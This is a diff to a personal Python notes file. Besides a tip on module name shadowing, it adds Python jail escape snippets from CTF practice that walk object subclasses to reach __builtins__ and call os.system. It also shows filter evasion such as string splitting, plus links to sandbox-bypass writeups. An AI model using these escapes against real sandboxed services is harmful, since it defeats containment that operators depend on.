@@ -480,6 +480,10 @@ from mypackage.myothermodule import add
 https://stackoverflow.com/questions/16981921/relative-imports-in-python-3
 https://chrisyeh96.github.io/2017/08/08/definitive-guide-python-imports.html
 
+- [!] Avoid importing module with same name as another visible file
+    - e.g. Given `foo.so`, `foo.py`, `import foo` may load `foo.so`
+        - https://stackoverflow.com/questions/65356321/creating-a-python-module-using-ctypes#65356321
+
 # generate markdown from csv
 
 ```python
@@ -497,7 +501,6 @@ print(df.to_markdown())
 - `globals() / locals() / vars()`: finding useful variables
 - `getattr() / setattr()`: call object.banned(), e.g. `getattr(object, "ban"+"ned")`
 - `"A""B" == "AB"`: alternative for `+`
-    - https://github.com/OpenToAllCTF/Tips#python-jails
 - blind
     ```python
     cmd = '''
@@ -506,8 +509,14 @@ print(df.to_markdown())
     ```
 - altenative for `__builtins__` or `import`
     ```python
+    # Listing keys to find classes
     ''.__dir__()
+    # ||
+    hasattr('', '__class__')
+    # ||
+    [print(i,x,dir(x)) for i,x in enumerate(().__class__.__base__.__subclasses__())]
 
+    # Take classes
     classes = ().__class__.__base__.__subclasses__()
     # ||
     classes = {}.__class__.__base__.__subclasses__()
@@ -515,15 +524,19 @@ print(df.to_markdown())
     classes = {}.__class__.__bases[0]__.__subclasses__()
     # ||
     classes = ''.__class__.__mro__[1].__subclasses__()
-    # e.g. 49 = warnings.catch_warnings
+
+    # Pick class with imports
+    # - e.g. 49 = warnings.catch_warnings
     b = classes[49]()._module.__builtins__
     m = b['__import__']('os')
-    m.system("foo")
+    m.system("ls")
+    # ||
+    ''.__class__.__mro__[-1].__subclasses__()[71]._Printer__setup.__globals__['os'].system("ls")
+    # - http://wapiflapi.github.io/2013/04/22/plaidctf-pyjail-story-of-pythons-escape.html
 
     print(eval(eval('"alles.__".'+str(print.__class__)[9]+'ppe'+'r()')+'code__.co_consts'))
+    # - [CTFtime\.org / ALLES! CTF 2020 / Pyjail ATricks / Writeup](https://ctftime.org/writeup/23289)
     ```
-    - [CTFtime\.org / ALLES! CTF 2020 / Pyjail ATricks / Writeup](https://ctftime.org/writeup/23289)
-    - https://gynvael.coldwind.pl/n/python_sandbox_escape
 - alternative for chars
     ```python
     print(str(print.__class__))
@@ -532,6 +545,12 @@ print(df.to_markdown())
     eval.__doc__
     # 'Evaluate the given source in the context of globals and locals.\n\nThe source may be a string representing a Python expression\nor a code object as returned by compile().\nThe globals must be a dictionary and locals can be any mapping,\ndefaulting to the current globals and locals.\nIf only globals is given, locals defaults to it.'
     ```
+
+- https://book.hacktricks.xyz/misc/basic-python/bypass-python-sandboxes
+- https://ctf-wiki.github.io/ctf-wiki/pwn/linux/sandbox/python-sandbox-escape/
+- [Breaking Out of a Python Sandbox · Issue \#6 · se162xg/notes · GitHub](https://github.com/se162xg/notes/issues/6)
+- [GitHub \- OpenToAllCTF/Tips: Useful tips by OTA CTF members \- Python jails](https://github.com/OpenToAllCTF/Tips#python-jails)
+- https://gynvael.coldwind.pl/n/python_sandbox_escape
 
 ### type coercion
 
